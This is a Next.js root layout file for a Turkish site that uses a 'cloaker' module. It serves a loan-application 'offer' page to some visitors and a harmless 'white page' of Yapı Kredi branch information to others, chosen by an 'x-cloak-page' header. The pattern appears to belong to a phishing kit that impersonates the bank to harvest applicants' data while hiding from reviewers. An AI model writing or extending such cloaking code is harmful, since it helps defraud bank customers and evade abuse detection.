import type { Metadata, Viewport } from "next";
import { headers } from "next/headers";
import { AccessGuard } from "@/components/AccessGuard";
import { CloakGate } from "@/components/CloakGate";
import {
  OFFER_PAGE_TITLE,
  WHITE_PAGE_TITLE,
} from "@/lib/cloaker";
import "./globals.css";

export async function generateMetadata(): Promise<Metadata> {
  const headerStore = await headers();
  const isOffer = headerStore.get("x-cloak-page") !== "white";

  return {
    title: isOffer ? OFFER_PAGE_TITLE : WHITE_PAGE_TITLE,
    description: isOffer
      ? "Bireysel İhtiyaç Kredisi başvuru formu"
      : "Yapı Kredi şubeleri ve iletişim bilgileri.",
  };
}

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="tr">
      <body>
        <CloakGate>
          <AccessGuard>{children}</AccessGuard>
        </CloakGate>
      </body>
    </html>
  );
}
